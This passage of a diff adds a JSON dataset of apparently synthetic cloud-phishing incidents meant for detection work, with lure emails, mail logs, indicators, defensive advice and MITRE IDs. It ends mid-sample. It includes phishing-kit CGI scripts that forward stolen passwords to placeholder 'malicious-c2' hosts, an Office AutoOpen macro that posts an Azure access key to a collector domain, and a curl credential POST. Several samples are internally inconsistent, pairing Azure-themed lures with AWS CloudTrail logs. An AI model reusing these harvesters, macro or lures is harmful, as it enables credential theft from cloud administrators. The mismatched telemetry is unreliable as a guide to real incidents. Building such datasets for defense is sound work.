@@ -1,0 +1,525 @@
+{
+  "samples": [
+    {
+      "scenario": "Phishing emails impersonate AWS Security Team alerts warning users about suspicious API activity, prompting them to log in via a fake AWS Management Console page that captures credentials and session tokens.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alerts@aws-secure.com>\r\nReceived: from mail.aws-secure.com (mail.aws-secure.com [203.0.113.77])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 0987654321\r\n\tfor <cloudadmin@enterprise.com>; Wed, 24 Apr 2024 09:15:10 -0400 (EDT)\r\nReceived-SPF: fail (enterprise.com: domain of security-alerts@aws-secure.com does not designate 203.0.113.77 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.77; envelope-from=security-alerts@aws-secure.com; helo=mail.aws-secure.com;\r\nAuthentication-Results: enterprise.com; dkim=none header.d=none\r\nFrom: AWS Security Team <security-alerts@aws-secure.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Urgent: Suspicious API Activity Detected on Your Account\r\nDate: Wed, 24 Apr 2024 09:15:10 -0400\r\nMessage-ID: <CAJdW9XfY2pXLZedMzk5@mail.aws-secure.com>\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Flag: NO",
+        "email_body": "Dear AWS User,\n\nWe detected suspicious API activity on your account that may indicate unauthorized access. Please verify your identity by logging in to your AWS Management Console using the link below:\n\nhttps://login.aws-secure.com/verify?user=cloudadmin&session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nFailure to verify within 24 hours will result in temporary suspension of your account.\n\nThank you,\nAWS Security Team",
+        "smtp_transaction_log": "220 mail.aws-secure.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.aws-secure.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security-alerts@aws-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudadmin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: AWS Security Team <security-alerts@aws-secure.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Urgent: Suspicious API Activity Detected on Your Account\r\n\r\nDear AWS User,\n\nWe detected suspicious API activity... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 0987654321\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "aws-secure.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-01-10T08:22:45Z",
+          "expiration_date": "2025-01-10T08:22:45Z",
+          "registrant": {
+            "name": "Privacy Protection Service",
+            "organization": "Privacy Protect LLC",
+            "email": "privacy@protectservice.com",
+            "address": "456 Privacy Lane, Austin, TX, US"
+          },
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "phishing_site_structure": {
+          "files": [
+            {
+              "path": "index.html",
+              "content": "<html><head><title>AWS Management Console - Login</title></head><body><form action=\"/submit\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"Username\"/><input type=\"password\" name=\"password\" placeholder=\"Password\"/><input type=\"submit\" value=\"Sign In\"/></form></body></html>"
+            },
+            {
+              "path": "submit",
+              "content": "#!/usr/bin/env python3\nimport cgi, requests\nform = cgi.FieldStorage()\nusername = form.getvalue('username')\npassword = form.getvalue('password')\ndata = {'user': username, 'pass': password}\nrequests.post('https://malicious-c2.aws-data.com/collect', json=data)\nprint('Content-type: text/html\\n')\nprint('<html><body>Login failed. Please try again.</body></html>')"
+            }
+          ]
+        },
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE5678\",\n    \"arn\": \"arn:aws:iam::123456789012:user/cloudadmin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"cloudadmin\"\n  },\n  \"eventTime\": \"2024-04-24T13:18:47Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.77\",\n  \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\"\n  },\n  \"requestID\": \"bcdef123-4567-890a-bcde-f1234567890a\",\n  \"eventID\": \"223e4567-e89b-12d3-a456-426614174111\",\n  \"readOnly\": false\n}",
+        "network_packet_capture": "Frame 89: 512 bytes on wire (4096 bits), 512 bytes captured (4096 bits)\nEthernet II, Src: 00:0c:29:7d:4f:5a, Dst: 02:42:ac:11:00:03\nInternet Protocol Version 4, Src: 203.0.113.77, Dst: 10.0.1.15\nTransmission Control Protocol, Src Port: 443, Dst Port: 52001, Seq: 1, Ack: 1, Len: 456\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /submit HTTP/1.1\r\nHost: login.aws-secure.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=cloudadmin&password=SuperSecret123",
+        "process_creation_log": "[2024-04-24T13:19:05Z] user=webuser pid=9123 parent_pid=9110 cmdline=\"python3 /var/www/cgi-bin/submit\"",
+        "indicators": {
+          "phishing_domain": "aws-secure.com",
+          "malicious_c2_domain": "malicious-c2.aws-data.com",
+          "suspicious_login_url": "https://login.aws-secure.com/verify",
+          "smtp_spf_fail": true,
+          "smtp_ip": "203.0.113.77",
+          "cloudtrail_event_name": "ConsoleLogin",
+          "suspicious_process_command": "python3 /var/www/cgi-bin/submit"
+        },
+        "detection_method": "Monitor incoming emails for failed SPF checks and suspicious domain names resembling legitimate cloud providers. Employ URL filtering to identify login pages hosted on non-official domains. Analyze CloudTrail logs for failed or anomalous login attempts from unusual IPs. Endpoint detection should flag execution of web server scripts handling login POST requests that forward credentials externally. Network monitoring to detect HTTP POST traffic containing credential data to uncommon external domains is critical.",
+        "relevant_mitre_techniques": [
+          "T1566.001",
+          "T1078",
+          "T1110",
+          "T1071.001",
+          "T1539"
+        ]
+      }
+    },
+    {
+      "scenario": "Phishing email campaigns spoof Microsoft Azure alerts about expired service principal credentials with a link to a fake Azure portal login page designed to harvest OAuth tokens and credentials.",
+      "technical_data": {
+        "email_headers": "Return-Path: <no-reply@azure-supports.com>\r\nReceived: from mail.azure-supports.com (mail.azure-supports.com [198.51.100.123])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 1122334455\r\n\tfor <cloudops@enterprise.com>; Thu, 25 Apr 2024 11:42:55 -0400 (EDT)\r\nReceived-SPF: neutral (enterprise.com: domain of no-reply@azure-supports.com does not designate 198.51.100.123 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.123; envelope-from=no-reply@azure-supports.com; helo=mail.azure-supports.com;\r\nAuthentication-Results: enterprise.com; dkim=none header.d=none\r\nFrom: Azure Support <no-reply@azure-supports.com>\r\nTo: cloudops@enterprise.com\r\nSubject: Action Required: Your Service Principal Credentials Have Expired\r\nDate: Thu, 25 Apr 2024 11:42:55 -0400\r\nMessage-ID: <CAJdW9XfY3pXLZedO0x0@mail.azure-supports.com>\r\nX-Mailer: Thunderbird 102.0\r\nX-Spam-Flag: NO",
+        "email_body": "Hello,\n\nOur records indicate that your Azure service principal credentials have expired and require immediate renewal to avoid service disruption.\n\nPlease log in to the Azure portal using the following secure link to update your credentials:\n\nhttps://portal.azure-supports.com/update-credentials?sp=serviceprincipal123\n\nIf you do not update your credentials within 48 hours, your services will be disabled.\n\nThank you,\nAzure Support Team",
+        "smtp_transaction_log": "220 mail.azure-supports.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.azure-supports.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<no-reply@azure-supports.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudops@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Azure Support <no-reply@azure-supports.com>\r\nTo: cloudops@enterprise.com\r\nSubject: Action Required: Your Service Principal Credentials Have Expired\r\n\r\nHello,\n\nOur records indicate... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 1122334455\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "azure-supports.com",
+          "registrar": "Porkbun LLC",
+          "creation_date": "2024-02-05T07:15:30Z",
+          "expiration_date": "2025-02-05T07:15:30Z",
+          "registrant": {
+            "name": "Anon Privacy Shield",
+            "organization": "Anon Privacy Shield",
+            "email": "shield@anonprivacy.com",
+            "address": "789 Anonymous Rd, Portland, OR, US"
+          },
+          "name_servers": [
+            "ns1.porkbun.com",
+            "ns2.porkbun.com"
+          ]
+        },
+        "phishing_site_structure": {
+          "files": [
+            {
+              "path": "login.html",
+              "content": "<html><head><title>Azure Portal - Sign In</title></head><body><form action=\"/token\" method=\"POST\"><input type=\"email\" name=\"email\" placeholder=\"Email address\" required/><input type=\"password\" name=\"password\" placeholder=\"Password\" required/><input type=\"submit\" value=\"Sign In\"/></form></body></html>"
+            },
+            {
+              "path": "token",
+              "content": "#!/usr/bin/env python3\nimport cgi, requests\nform = cgi.FieldStorage()\nemail = form.getvalue('email')\npassword = form.getvalue('password')\ndata = {'email': email, 'password': password}\nrequests.post('https://malicious-c2.azure-data.net/collect', json=data)\nprint('Content-type: text/html\\n')\nprint('<html><body>Authentication failed. Please try again.</body></html>')"
+            }
+          ]
+        },
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE9012\",\n    \"arn\": \"arn:aws:iam::123456789012:user/cloudops\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"cloudops\"\n  },\n  \"eventTime\": \"2024-04-25T15:45:22Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-east-2\",\n  \"sourceIPAddress\": \"198.51.100.123\",\n  \"userAgent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\"\n  },\n  \"requestID\": \"cdef1234-5678-90ab-cdef-1234567890ab\",\n  \"eventID\": \"323e4567-e89b-12d3-a456-426614174222\",\n  \"readOnly\": false\n}",
+        "network_packet_capture": "Frame 134: 584 bytes on wire (4672 bits), 584 bytes captured (4672 bits)\nEthernet II, Src: 00:0c:29:5e:7a:8b, Dst: 02:42:ac:11:00:04\nInternet Protocol Version 4, Src: 198.51.100.123, Dst: 10.0.2.20\nTransmission Control Protocol, Src Port: 443, Dst Port: 53010, Seq: 1, Ack: 1, Len: 520\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /token HTTP/1.1\r\nHost: portal.azure-supports.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\n\r\nemail=cloudops%40enterprise.com&password=AzurePassw0rd!",
+        "process_creation_log": "[2024-04-25T15:46:01Z] user=www-data pid=10234 parent_pid=10200 cmdline=\"python3 /var/www/cgi-bin/token\"",
+        "indicators": {
+          "phishing_domain": "azure-supports.com",
+          "malicious_c2_domain": "malicious-c2.azure-data.net",
+          "suspicious_login_url": "https://portal.azure-supports.com/update-credentials",
+          "smtp_spf_neutral": true,
+          "smtp_ip": "198.51.100.123",
+          "cloudtrail_event_name": "ConsoleLogin",
+          "suspicious_process_command": "python3 /var/www/cgi-bin/token"
+        },
+        "detection_method": "Detect emails claiming to be Azure alerts but originating from neutral or failing SPF domains. Use web proxy logs to identify user authentication attempts to non-official Azure portal URLs. Monitor CloudTrail for failed login attempts from IPs associated with phishing campaigns. Endpoint monitoring to detect execution of unauthorized CGI scripts handling credential submission is recommended. Network traffic inspection to find credential POST requests to unknown external servers is advised.",
+        "relevant_mitre_techniques": [
+          "T1566.001",
+          "T1078",
+          "T1110",
+          "T1071.001",
+          "T1539"
+        ]
+      }
+    },
+    {
+      "scenario": "Phishing emails impersonate a major cloud provider's security team, sending alerts about suspicious login attempts and urging users to verify their identity by submitting credentials through a fake login portal hosted on a lookalike domain.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security-alerts@aws-secure-notify.com>\r\nReceived: from mail.aws-secure-notify.com (mail.aws-secure-notify.com [203.0.113.77])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 0987654321\r\n\tfor <cloudadmin@enterprise.com>; Wed, 24 Apr 2024 09:15:02 -0400 (EDT)\r\nReceived-SPF: fail (enterprise.com: domain of security-alerts@aws-secure-notify.com does not designate 203.0.113.77 as permitted sender) receiver=enterprise.com; client-ip=203.0.113.77; envelope-from=security-alerts@aws-secure-notify.com; helo=mail.aws-secure-notify.com;\r\nAuthentication-Results: enterprise.com; dkim=fail header.d=aws-secure-notify.com\r\nFrom: AWS Security Team <security-alerts@aws-secure-notify.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Urgent: Suspicious Login Attempt Detected on Your AWS Account\r\nDate: Wed, 24 Apr 2024 09:15:02 -0400\r\nMessage-ID: <CAKdjQxWzY2pXLZfdL1M4@mail.aws-secure-notify.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Dear AWS User,\n\nWe have detected a suspicious login attempt to your AWS Management Console from IP address 198.51.100.89. To secure your account, please verify your identity by logging in using the link below within the next 30 minutes:\n\nhttps://aws-secure-login.verify-aws.com/login?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nFailure to verify may result in a temporary account suspension.\n\nThank you,\nAWS Security Team",
+        "smtp_transaction_log": "220 mail.aws-secure-notify.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.aws-secure-notify.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<security-alerts@aws-secure-notify.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cloudadmin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: AWS Security Team <security-alerts@aws-secure-notify.com>\r\nTo: cloudadmin@enterprise.com\r\nSubject: Urgent: Suspicious Login Attempt Detected on Your AWS Account\r\n\r\nDear AWS User,... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 0987654321\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "aws-secure-login.verify-aws.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-04-10T08:20:00Z",
+          "expiration_date": "2025-04-10T08:20:00Z",
+          "registrant": {
+            "name": "John Doe",
+            "organization": "CyberPhish LLC",
+            "email": "john.doe@cyberphish.fake",
+            "address": "456 Malicious Rd, Phishtown, CA, US"
+          },
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "fake_login_portal_html": "<!DOCTYPE html><html><head><title>AWS Login</title></head><body><form action=\"https://aws-secure-login.verify-aws.com/authenticate\" method=\"POST\"><input type=\"text\" name=\"username\" placeholder=\"AWS Username\"/><input type=\"password\" name=\"password\" placeholder=\"Password\"/><button type=\"submit\">Sign In</button></form></body></html>",
+        "network_packet_capture": "Frame 87: 1024 bytes on wire (8192 bits), 1024 bytes captured (8192 bits)\nEthernet II, Src: 00:14:22:01:23:45, Dst: 00:0c:29:ab:cd:ef\nInternet Protocol Version 4, Src: 203.0.113.77, Dst: 10.1.1.20\nTransmission Control Protocol, Src Port: 443, Dst Port: 52034, Seq: 101, Ack: 201, Len: 512\nTLSv1.3 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /authenticate HTTP/1.1\r\nHost: aws-secure-login.verify-aws.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\nusername=cloudadmin&password=SuperSecret123",
+        "process_creation_log": "[2024-04-24T09:17:43Z] user=cloudadmin pid=2230 parent_pid=2225 cmdline=\"curl -k -X POST -d 'username=cloudadmin&password=SuperSecret123' https://aws-secure-login.verify-aws.com/authenticate\"",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE5678\",\n    \"arn\": \"arn:aws:iam::123456789012:user/cloudadmin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"cloudadmin\"\n  },\n  \"eventTime\": \"2024-04-24T09:16:00Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"198.51.100.89\",\n  \"userAgent\": \"Mozilla/5.0\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Failure\",\n    \"Message\": \"Incorrect password\"\n  },\n  \"requestID\": \"abcdef98-7654-3210-fedc-ba9876543210\",\n  \"eventID\": \"789e0123-e89b-45d6-a123-426614171234\",\n  \"readOnly\": true\n}",
+        "indicators": {
+          "phishing_domain": "aws-secure-login.verify-aws.com",
+          "malicious_ip": "203.0.113.77",
+          "suspicious_login_ip": "198.51.100.89",
+          "smtp_ip": "203.0.113.77",
+          "fake_portal_url": "https://aws-secure-login.verify-aws.com/login",
+          "cloudtrail_failed_login_event": "ConsoleLogin",
+          "suspicious_process_command": "curl -k -X POST -d 'username=cloudadmin&password=SuperSecret123' https://aws-secure-login.verify-aws.com/authenticate"
+        }
+      },
+      "detection_method": "Monitor inbound emails for SPF/DKIM failures from cloud provider domains and alert on suspicious domain lookalikes. Analyze web proxy logs for user access to newly registered domains mimicking cloud login pages. CloudTrail should be monitored for failed and successful login attempts from unusual IP addresses. Endpoint detection should flag command-line HTTP POST requests sending credential data. Use user awareness training to identify phishing emails requesting urgent credential submission.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1071.001",
+        "T1110",
+        "T1078",
+        "T1586"
+      ]
+    },
+    {
+      "scenario": "Cloud administrators receive spear-phishing emails disguised as official cloud provider billing alerts, including malicious Excel attachments with embedded macros that, when enabled, exfiltrate cloud service account keys stored on the local machine.",
+      "technical_data": {
+        "email_headers": "Return-Path: <billing@azure-billing-alerts.com>\r\nReceived: from mail.azure-billing-alerts.com (mail.azure-billing-alerts.com [198.51.100.123])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 1122334455\r\n\tfor <admin@enterprise.com>; Thu, 25 Apr 2024 14:45:55 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of billing@azure-billing-alerts.com designates 198.51.100.123 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.123; envelope-from=billing@azure-billing-alerts.com; helo=mail.azure-billing-alerts.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=azure-billing-alerts.com\r\nFrom: Azure Billing <billing@azure-billing-alerts.com>\r\nTo: admin@enterprise.com\r\nSubject: Your Azure Account: Invoice Overdue Notice\r\nDate: Thu, 25 Apr 2024 14:45:55 -0400\r\nMessage-ID: <CAJkL9gYz9cXLZdfMzNt@mail.azure-billing-alerts.com>\r\nX-Mailer: Microsoft Outlook 16.0\r\nX-Spam-Flag: NO",
+        "email_body": "Dear Azure Customer,\n\nOur records indicate your Azure subscription invoice #8745 is overdue. Please find the attached invoice for your review. Failure to pay within 7 days may result in service suspension.\n\nInvoice attached: Invoice_8745_April2024.xlsm\n\nThank you for your prompt attention.\nAzure Billing Department",
+        "smtp_transaction_log": "220 mail.azure-billing-alerts.com ESMTP Postfix\r\nEHLO enterprise.com\r\n250-mail.azure-billing-alerts.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<billing@azure-billing-alerts.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Azure Billing <billing@azure-billing-alerts.com>\r\nTo: admin@enterprise.com\r\nSubject: Your Azure Account: Invoice Overdue Notice\r\n\r\nDear Azure Customer,... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 1122334455\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "azure-billing-alerts.com",
+          "registrar": "NameSilo, LLC",
+          "creation_date": "2024-02-27T15:10:33Z",
+          "expiration_date": "2025-02-27T15:10:33Z",
+          "registrant": {
+            "name": "PhishMaster Inc",
+            "organization": "PhishMaster Inc",
+            "email": "contact@phishmaster.fake",
+            "address": "789 Fraud Lane, Scamville, NY, US"
+          },
+          "name_servers": [
+            "ns1.namesilo.net",
+            "ns2.namesilo.net"
+          ]
+        },
+        "malicious_excel_macro": "Sub AutoOpen()\n  Dim http As Object\n  Dim json As String\n  Set http = CreateObject(\"MSXML2.XMLHTTP\")\n  json = \"{\\\"accessKey\\\": \\\"\" & Environ(\"AZURE_ACCESS_KEY\") & \"\\\"}\"\n  http.Open \"POST\", \"https://malicious-collector.cloud/collect\", False\n  http.setRequestHeader \"Content-Type\", \"application/json\"\n  http.Send json\nEnd Sub",
+        "network_packet_capture": "Frame 101: 740 bytes on wire (5920 bits), 740 bytes captured (5920 bits)\nEthernet II, Src: 00:1a:4b:cd:ef:01, Dst: 00:0c:29:7a:bc:de\nInternet Protocol Version 4, Src: 198.51.100.123, Dst: 10.2.0.15\nTransmission Control Protocol, Src Port: 443, Dst Port: 52987, Seq: 1, Ack: 1, Len: 512\nTLSv1.2 Record Layer: Application Data Protocol: HTTP/1.1\nPOST /collect HTTP/1.1\r\nHost: malicious-collector.cloud\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 47\r\n\r\n{\"accessKey\": \"AZURE_ACCESS_KEY_EXFILTRATED_VALUE\"}",
+        "process_creation_log": "[2024-04-25T14:47:00Z] user=admin pid=4521 parent_pid=4500 cmdline=\"Excel.exe /automation Invoice_8745_April2024.xlsm\"\n[2024-04-25T14:47:05Z] user=admin pid=4523 parent_pid=4521 cmdline=\"mshta https://malicious-collector.cloud/collect\"",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDAEXAMPLE9876\",\n    \"arn\": \"arn:aws:iam::123456789012:user/admin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"admin\"\n  },\n  \"eventTime\": \"2024-04-25T14:48:00Z\",\n  \"eventSource\": \"sts.amazonaws.com\",\n  \"eventName\": \"AssumeRole\",\n  \"awsRegion\": \"us-east-1\",\n  \"sourceIPAddress\": \"10.2.0.15\",\n  \"userAgent\": \"Excel Macro\",\n  \"requestParameters\": {\n    \"roleArn\": \"arn:aws:iam::123456789012:role/CloudAdminRole\",\n    \"roleSessionName\": \"maliciousSession\"\n  },\n  \"responseElements\": {\n    \"credentials\": {\n      \"accessKeyId\": \"ASIAEXAMPLE\",\n      \"secretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n    }\n  },\n  \"requestID\": \"f1e2d3c4-b5a6-7890-cdef-123456789abc\",\n  \"eventID\": \"456e7890-e12b-34d5-a678-426614170000\",\n  \"readOnly\": false\n}",
+        "indicators": {
+          "phishing_domain": "azure-billing-alerts.com",
+          "malicious_c2_domain": "malicious-collector.cloud",
+          "smtp_ip": "198.51.100.123",
+          "malicious_attachment": "Invoice_8745_April2024.xlsm",
+          "macro_name": "AutoOpen",
+          "cloudtrail_event_name": "AssumeRole",
+          "suspicious_process_command": "Excel.exe /automation Invoice_8745_April2024.xlsm"
+        }
+      },
+      "detection_method": "Scan inbound emails and attachments for macro-enabled Office files from untrusted domains. Use sandboxing to analyze macro behavior and detect network exfiltration attempts. Monitor DNS and HTTP logs for connections to suspicious or newly registered domains. CloudTrail should be reviewed for unusual AssumeRole API calls and credential use patterns. Endpoint detection should alert on Excel processes spawning network connections and mshta executions.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1204.002",
+        "T1059.005",
+        "T1071.001",
+        "T1078",
+        "T1539"
+      ]
+    },
+    {
+      "scenario": "Phishing emails impersonate a popular cloud service provider's support team, directing cloud administrators to a spoofed login page designed to steal multi-factor authentication tokens and credentials for cloud console access.",
+      "technical_data": {
+        "email_headers": "Return-Path: <support@cloudsecurity-alerts.com>\r\nReceived: from mail.cloudsecurity-alerts.com (mail.cloudsecurity-alerts.com [203.0.113.89])\r\n\tby mail.companycorp.com (Postfix) with ESMTPS id 0987654321\r\n\tfor <admin@companycorp.com>; Wed, 19 Apr 2024 09:15:30 -0400 (EDT)\r\nReceived-SPF: fail (companycorp.com: domain of support@cloudsecurity-alerts.com does not designate 203.0.113.89 as permitted sender) receiver=companycorp.com; client-ip=203.0.113.89; envelope-from=support@cloudsecurity-alerts.com; helo=mail.cloudsecurity-alerts.com;\r\nAuthentication-Results: companycorp.com; dkim=none header.d=none\r\nFrom: Cloud Security Support <support@cloudsecurity-alerts.com>\r\nTo: admin@companycorp.com\r\nSubject: Urgent: Verify Your Cloud Console Access\r\nDate: Wed, 19 Apr 2024 09:15:30 -0400\r\nMessage-ID: <CAJdW8XfY2qXLZedLzM1@mail.cloudsecurity-alerts.com>\r\nX-Mailer: PHPMailer 6.5.0 (https://github.com/PHPMailer/PHPMailer)\r\nX-Spam-Flag: NO",
+        "email_body": "Dear Cloud Administrator,\n\nWe detected unusual activity on your cloud account. Please verify your login credentials and MFA token to ensure your account security:\n\nhttps://secure-login.cloudsecurity-alerts.com/verify?session=1234567890abcdef\n\nFailure to verify within 24 hours will result in temporary suspension of your cloud console access.\n\nThank you,\nCloud Security Support Team",
+        "smtp_transaction_log": "220 mail.cloudsecurity-alerts.com ESMTP Postfix\r\nEHLO companycorp.com\r\n250-mail.cloudsecurity-alerts.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<support@cloudsecurity-alerts.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<admin@companycorp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Cloud Security Support <support@cloudsecurity-alerts.com>\r\nTo: admin@companycorp.com\r\nSubject: Urgent: Verify Your Cloud Console Access\r\n\r\nDear Cloud Administrator,... (truncated)\r\n.\r\n250 2.0.0 Ok: queued as 0987654321\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "cloudsecurity-alerts.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2024-02-28T08:20:10Z",
+          "expiration_date": "2025-02-28T08:20:10Z",
+          "registrant": {
+            "name": "Domain Privacy Service",
+            "organization": "Domains By Proxy, LLC",
+            "email": "privacy@domainsbyproxy.com",
+            "address": "14747 N Northsight Blvd Suite 111, Scottsdale, AZ, US"
+          },
+          "name_servers": [
+            "ns1.godaddy.com",
+            "ns2.godaddy.com"
+          ]
+        },
+        "spoofed_login_page": {
+          "url": "https://secure-login.cloudsecurity-alerts.com/verify",
+          "html_snippet": "<form action=\"https://malicious-collector.cloudsecurity-alerts.com/submit\" method=\"POST\">\n  <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n  <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n  <input type=\"text\" name=\"mfa_token\" placeholder=\"MFA Token\" required />\n  <button type=\"submit\">Verify</button>\n</form>"
+        },
+        "http_request_log": "POST /submit HTTP/1.1\r\nHost: malicious-collector.cloudsecurity-alerts.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 58\r\n\r\nusername=admin&password=SuperSecret123&mfa_token=123456",
+        "cloudtrail_log_entry": "{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROAEXAMPLE5678:admin\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/AdminRole/admin\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"admin\"\n  },\n  \"eventTime\": \"2024-04-19T13:17:45Z\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"eventName\": \"ConsoleLogin\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.89\",\n  \"userAgent\": \"Mozilla/5.0\",\n  \"requestParameters\": null,\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Success\"\n  },\n  \"requestID\": \"fedcba98-7654-3210-fedc-ba9876543210\",\n  \"eventID\": \"234e5678-f89b-23d4-b567-526715275001\",\n  \"readOnly\": false\n}",
